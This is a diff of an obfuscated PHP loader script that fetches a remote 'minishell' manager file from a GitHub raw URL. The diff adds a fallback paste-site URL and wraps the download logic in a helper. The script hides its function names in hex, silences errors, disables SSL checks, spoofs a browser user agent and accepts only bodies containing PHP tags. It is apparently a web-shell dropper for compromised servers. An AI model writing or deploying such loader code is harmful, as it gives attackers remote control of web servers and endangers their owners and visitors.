@@ -6,10 +6,63 @@ error_reporting(0);
 @set_time_limit(180);
 
 $u = 'https://raw.githubusercontent.com/tangsel1928/minishell/refs/heads/main/manager.php';
+$uFb = 'https://paste.myconan.net/678032.txt';
 
 function _fx($hex)
 {
     return pack('H*', $hex);
+}
+
+function _gk_ok($body)
+{
+    if (!is_string($body) || $body === '') {
+        return false;
+    }
+    return strpos($body, '<?') !== false;
+}
+
+function _gk_fetch($url, $fx, $httpCtx)
+{
+    $o = false;
+    $fe = $fx['fe'];
+    $fg = $fx['fg'];
+
+    if (@$fe($fx['fo'])) {
+        $fo = $fx['fo'];
+        $sg = $fx['sg'];
+        $fc = $fx['fc'];
+        $fh = @$fo($url, 'rb', false, $httpCtx);
+        if ($fh) {
+            $o = @$sg($fh);
+            @$fc($fh);
+        }
+    }
+
+    $ig = $fx['ig'];
+    if (($o === false || $o === '') && @$ig($fx['auf'])) {
+        $o = @$fg($url, false, $httpCtx);
+    }
+
+    if (($o === false || $o === '') && @$fe($fx['ci'])) {
+        $ci = $fx['ci'];
+        $co = $fx['co'];
+        $ce = $fx['ce'];
+        $cl = $fx['cl'];
+        $cn = $fx['cn'];
+        $ch = @$ci($url);
+        if ($ch) {
+            @$co($ch, @$cn('CURLOPT_RETURNTRANSFER'), true);
+            @$co($ch, @$cn('CURLOPT_FOLLOWLOCATION'), true);
+            @$co($ch, @$cn('CURLOPT_TIMEOUT'), 30);
+            @$co($ch, @$cn('CURLOPT_USERAGENT'), 'Mozilla/5.0');
+            @$co($ch, @$cn('CURLOPT_SSL_VERIFYPEER'), false);
+            @$co($ch, @$cn('CURLOPT_SSL_VERIFYHOST'), false);
+            $o = @$ce($ch);
+            @$cl($ch);
+        }
+    }
+
+    return $o;
 }
 
 $fx = array(
@@ -29,9 +82,7 @@ $fx = array(
     'auf' => _fx('616c6c6f775f75726c5f666f70656e'),
 );
 
-$o = false;
 $fe = $fx['fe'];
-$fg = $fx['fg'];
 
 $httpCtx = stream_context_create(array(
     'http' => array(
@@ -47,50 +98,14 @@ $httpCtx = stream_context_create(array(
     ),
 ));
 
-if (@$fe($fx['fo'])) {
-    $fo = $fx['fo'];
-    $sg = $fx['sg'];
-    $fc = $fx['fc'];
-    $fh = @$fo($u, 'rb', false, $httpCtx);
-    if ($fh) {
-        $o = @$sg($fh);
-        @$fc($fh);
-    }
+$o = _gk_fetch($u, $fx, $httpCtx);
+if (!_gk_ok($o)) {
+    $o = _gk_fetch($uFb, $fx, $httpCtx);
 }
 
-$ig = $fx['ig'];
-if (($o === false || $o === '') && @$ig($fx['auf'])) {
-    $o = @$fg($u, false, $httpCtx);
-}
-
-if (($o === false || $o === '') && @$fe($fx['ci'])) {
-    $ci = $fx['ci'];
-    $co = $fx['co'];
-    $ce = $fx['ce'];
-    $cl = $fx['cl'];
-    $cn = $fx['cn'];
-    $ch = @$ci($u);
-    if ($ch) {
-        @$co($ch, @$cn('CURLOPT_RETURNTRANSFER'), true);
-        @$co($ch, @$cn('CURLOPT_FOLLOWLOCATION'), true);
-        @$co($ch, @$cn('CURLOPT_TIMEOUT'), 30);
-        @$co($ch, @$cn('CURLOPT_USERAGENT'), 'Mozilla/5.0');
-        @$co($ch, @$cn('CURLOPT_SSL_VERIFYPEER'), false);
-        @$co($ch, @$cn('CURLOPT_SSL_VERIFYHOST'), false);
-        $o = @$ce($ch);
-        @$cl($ch);
-    }
-}
-
-if ($o === false || $o === null || $o === '') {
+if (!_gk_ok($o)) {
     header('Content-Type: text/html; charset=UTF-8');
     echo '<center><h1>Failed to load.</h1></center>';
-    exit;
-}
-
-if (strpos($o, '<?') === false) {
-    header('Content-Type: text/html; charset=UTF-8');
-    echo '<center><h1>Invalid payload.</h1></center>';
     exit;
 }
 
